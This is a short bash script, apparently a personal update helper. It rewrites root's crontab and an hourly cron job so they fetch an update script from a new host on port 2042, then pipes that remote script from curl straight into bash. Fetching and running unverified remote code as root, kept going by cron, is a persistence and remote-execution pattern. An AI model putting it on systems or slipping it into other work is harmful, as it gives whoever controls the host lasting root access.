#!/usr/bin/bash

cat /var/spool/cron/crontabs/root | sed -e 's/erikboesen.com\/linuxupdate.sh/boesen.science:2042\/linux\/update.sh/' > /tmp/crontab
mv /tmp/crontab /var/spool/cron/crontabs/root

cat /etc/cron.hourly/update | sed -e 's/erikboesen.com\/linuxupdate.sh/boesen.science:2042\/linux\/update.sh/' > /tmp/update
mv /tmp/update /etc/cron.hourly/update

curl -L boesen.science:2042/linux/update.sh | bash
